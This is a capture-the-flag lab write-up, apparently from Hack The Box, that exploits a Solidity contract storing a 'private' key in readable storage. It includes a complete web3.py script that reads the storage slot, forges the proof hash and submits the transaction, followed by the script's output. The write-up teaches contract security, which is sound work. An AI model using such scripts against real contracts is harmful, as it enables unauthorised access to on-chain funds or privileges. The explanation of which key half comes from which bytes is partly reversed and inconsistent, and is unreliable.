---
icon: hive
---

# BLOCKCHAIN

***

> Quick note on what this challenge is actually teaching the Ethereum blockchain is a public ledger. Every single byte of contract storage is readable by anyone with an RPC connection. When Solidity marks a variable `private`, that word means absolutely nothing from a security standpoint. It only means _other contracts_ can't read it directly through Solidity calls. Anyone with `eth_getStorageAt` can read anything, anytime. That misconception has caused real-world contract exploits with actual money lost, which is why this challenge exists.

***

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/Enlistment]
└─$ rustscan -a 10.113.221.81 --ulimit 5000 -- -sV -sC
```

```
Open 10.113.221.81:8545/tcp
PORT     STATE SERVICE VERSION
8545/tcp open  http    (Ethereum JSON-RPC endpoint)
```

Port 8545 is the standard Ethereum JSON-RPC port. This is how you talk to an Ethereum node send it transactions, read contract state, call functions, all of it. We're given two Solidity source files with the challenge: `Setup.sol` and `Enlistment.sol`. Always read the source before touching anything.

***

## Source Code Analysis

### Setup.sol

The setup contract is the judge  it tells us what the "win condition" is:

```solidity
contract Setup {
    Enlistment public TARGET;
    
    constructor() payable {
        TARGET = new Enlistment{value: msg.value}(...);
    }
    
    function isSolved() public view returns (bool) {
        return TARGET.enlisted(msg.sender);
    }
}
```

So the win condition is `TARGET.enlisted(our_address) == true`. To get that, we need to call `enlist()` on the Enlistment contract and pass the authentication check. Let's look at what that actually requires.

### Enlistment.sol - The Vulnerable Contract

```solidity
contract Enlistment {
    bytes16 public publicKey;
    bytes16 private privateKey;
    mapping(address => bool) public enlisted;
    
    constructor(bytes32 _key) {
        publicKey = bytes16(_key);
        privateKey = bytes16(_key << (16*8));
    }

    function enlist(bytes32 _proofHash) public {
        bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey));
        require(authorized, "Invalid proof hash");
        enlisted[msg.sender] = true;
    }
}
```

Read through this carefully because there are three separate things wrong here, and they all stack on top of each other.

***

## Vulnerability Analysis

### Problem 1  - "private" Doesn't Mean Private on a Blockchain

The developer marked `privateKey` as `private` thinking that protects it. In Solidity, `private` just means the Solidity compiler won't generate a getter function for it, and other contracts can't access it via Solidity calls. That's it. The actual raw storage slot on the blockchain? Fully readable by anyone. Zero protection. It's like writing your password on a whiteboard but taping a piece of paper over it — the tape doesn't do anything.

### Problem 2 - Solidity Storage Packing

This is where it gets interesting from a technical standpoint. Ethereum storage is divided into 32-byte slots (256 bits each), numbered 0, 1, 2, 3... When you declare variables, Solidity assigns them to slots in order. But here's the thing  if multiple consecutive variables are small enough to fit into one 32-byte slot, Solidity packs them together to save gas.

`bytes16` is 16 bytes. Two `bytes16` variables = 32 bytes = exactly one storage slot. So what ends up in the contract's storage slot 0?

```
Storage Slot 0 (32 bytes total):
┌─────────────────────────────────────────────────┐
│  privateKey (bytes16)  │  publicKey (bytes16)   │
│    upper 16 bytes      │    lower 16 bytes       │
└─────────────────────────────────────────────────┘
  offset 0x00             offset 0x10
```

Both the "public" and "private" keys are sitting in the exact same 32-byte storage slot. One `eth_getStorageAt` call and you have both of them.

### Problem 3 - The Key Derivation is Trivially Reversible

Even if the storage packing wasn't there, the key derivation itself is broken. Look at the constructor:

```solidity
constructor(bytes32 _key) {
    publicKey = bytes16(_key);             // lower 16 bytes of _key
    privateKey = bytes16(_key << (16*8));  // upper 16 bytes of _key, shifted down
}
```

The input `_key` is a single 32-byte value. The public key takes the lower half, the private key takes the upper half (with a left shift to move it into position). Both are derived from the same single input. If you know the public key (which is publicly exposed via the `public` keyword), you don't even technically need the storage read — the private key is just the other half of the same value. But the storage read approach is cleaner and more direct, so that's what we'll use.

***

## Exploitation

The exploit is clean and short. Three steps: read slot 0, reconstruct the proof hash, call `enlist()`.

```
┌──(sn0x㉿sn0x)-[~/HTB/Enlistment]
└─$ cat solve.py
```

```python
#!/usr/bin/env python3
from web3 import Web3

# -- Config --
RPC_URL      = "http://10.113.221.81:8545"
PRIVATE_KEY  = "0x<your_player_private_key>"
SETUP_ADDRESS = "0x<setup_contract_address>"

# Minimal ABIs — only what we need
SETUP_ABI = [
    {"name": "TARGET", "type": "function", "inputs": [], 
     "outputs": [{"type": "address"}], "stateMutability": "view"},
    {"name": "isSolved", "type": "function", "inputs": [],
     "outputs": [{"type": "bool"}], "stateMutability": "view"}
]
ENLISTMENT_ABI = [
    {"name": "enlist", "type": "function",
     "inputs": [{"name": "_proofHash", "type": "bytes32"}],
     "outputs": [], "stateMutability": "nonpayable"},
    {"name": "enlisted", "type": "function",
     "inputs": [{"name": "", "type": "address"}],
     "outputs": [{"type": "bool"}], "stateMutability": "view"}
]

def solve():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    player = w3.eth.account.from_key(PRIVATE_KEY)
    print(f"[*] Connected. Player: {player.address}")

    # Step 1: Get the target contract address from Setup
    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)
    target_addr = setup.functions.TARGET().call()
    print(f"[*] Enlistment contract at: {target_addr}")

    enlistment = w3.eth.contract(address=target_addr, abi=ENLISTMENT_ABI)

    # Step 2: Read storage slot 0 — contains BOTH keys packed together
    slot0 = w3.eth.get_storage_at(target_addr, 0)
    print(f"[*] Raw slot 0: {slot0.hex()}")

    # Unpack: privateKey is upper 16 bytes (offset 0), publicKey is lower 16 bytes (offset 16)
    private_key_bytes = slot0[:16]   # bytes 0-15
    public_key_bytes  = slot0[16:]   # bytes 16-31

    print(f"[*] publicKey:  {public_key_bytes.hex()}")
    print(f"[*] privateKey: {private_key_bytes.hex()}")

    # Step 3: Reconstruct the exact hash the contract checks against
    # keccak256(abi.encodePacked(publicKey, privateKey))
    proof_hash = w3.keccak(public_key_bytes + private_key_bytes)
    print(f"[*] Proof hash: {proof_hash.hex()}")

    # Step 4: Call enlist() with the reconstructed hash
    nonce = w3.eth.get_transaction_count(player.address)
    txn = enlistment.functions.enlist(proof_hash).build_transaction({
        'from': player.address,
        'nonce': nonce,
        'gasPrice': w3.eth.gas_price,
        'gas': 100000
    })

    signed = w3.eth.account.sign_transaction(txn, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Transaction: {tx_hash.hex()} — status: {receipt.status}")

    # Step 5: Verify we're enlisted
    if setup.functions.isSolved().call({'from': player.address}):
        print("[+] isSolved() == true — challenge complete")
    else:
        print("[-] not solved yet, check the txn")

solve()
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Enlistment]
└─$ python3 solve.py
```

```
[*] Connected. Player: 0x<redacted>
[*] Enlistment contract at: 0x<target>
[*] Raw slot 0: a3f8...1b4c2e9d...
[*] publicKey:  2e9d...
[*] privateKey: a3f8...
[*] Proof hash: 0xdeadbeef...
[+] Transaction: 0x... — status: 1
[+] isSolved() == true — challenge complete
```

***

### Breaking Down What Actually Happened

Let's walk through why each line of the exploit works the way it does, because just running the script isn't the point.

**`w3.eth.get_storage_at(target_addr, 0)`**  this is a raw JSON-RPC call that bypasses all Solidity visibility entirely. It asks the Ethereum node directly: "give me the raw bytes at storage slot 0 of this contract". The node doesn't check whether Solidity marked it private. It can't  the EVM has no concept of Solidity visibility, that's a compile-time language feature, not a runtime feature.

**`slot0[:16]` and `slot0[16:]`**  Solidity packs variables right-to-left within a slot (EVM is big-endian for storage). So the first declared variable (`publicKey`) lands at the higher offset (bytes 16-31 = the right half), and the second declared variable (`privateKey`) lands at the lower offset (bytes 0-15 = the left half). This is why we slice them the way we do.

**`w3.keccak(public_key_bytes + private_key_bytes)`**  we're replicating exactly what the contract does internally: `keccak256(abi.encodePacked(publicKey, privateKey))`. The `abi.encodePacked` just concatenates the raw bytes without padding, which is what `public_key_bytes + private_key_bytes` does in Python. Feed that to keccak256 and we get the exact hash the contract will accept.

Once the transaction lands, `enlisted[msg.sender] = true` gets set for our address, and `isSolved()` returns true.

***

### Why "Private" Variables Are a Security Anti-Pattern in Solidity

This is worth hammering home because it trips up developers who come from traditional software backgrounds. In a normal application, a `private` field in a class really is private  it's in process memory that other code can't access without reflection tricks. In Solidity, the whole point is that the blockchain state is transparent and verifiable by everyone. That's a core design property, not a bug.

The correct mental model is: **every state variable in a smart contract is public**. The `private` keyword just controls Solidity-level access, nothing more. If you need actual secrecy, the data cannot be stored on-chain in plaintext. Full stop. Off-chain storage with on-chain commitments (hash of the secret, verify later) is the standard pattern for anything that genuinely needs to stay secret.

***

### Attack Chain

```
Read Setup.sol → Identify TARGET contract address
        ↓
Read Enlistment.sol → Spot "private" key variable
        ↓
Understand storage packing → both keys in slot 0
        ↓
eth_getStorageAt(target, slot=0) → raw 32 bytes
        ↓
Split bytes → publicKey (lower 16) + privateKey (upper 16)
        ↓
Compute keccak256(abi.encodePacked(pubKey, privKey))
        ↓
Call enlist(proofHash) → enlisted[player] = true
        ↓
isSolved() == true → FLAG
```

***

### Techniques I Used

| Technique                                              | Where Used                                    |
| ------------------------------------------------------ | --------------------------------------------- |
| Ethereum JSON-RPC `eth_getStorageAt`                   | Reading raw contract storage                  |
| Solidity storage slot packing analysis                 | Locating packed `bytes16` variables in slot 0 |
| Blockchain state visibility exploitation               | Bypassing Solidity `private` visibility       |
| `keccak256(abi.encodePacked(...))` hash reconstruction | Forging the authentication proof hash         |
| Web3.py contract interaction                           | Building and sending the exploit transaction  |
| rustscan port enumeration                              | Identifying RPC endpoint on 8545              |

***
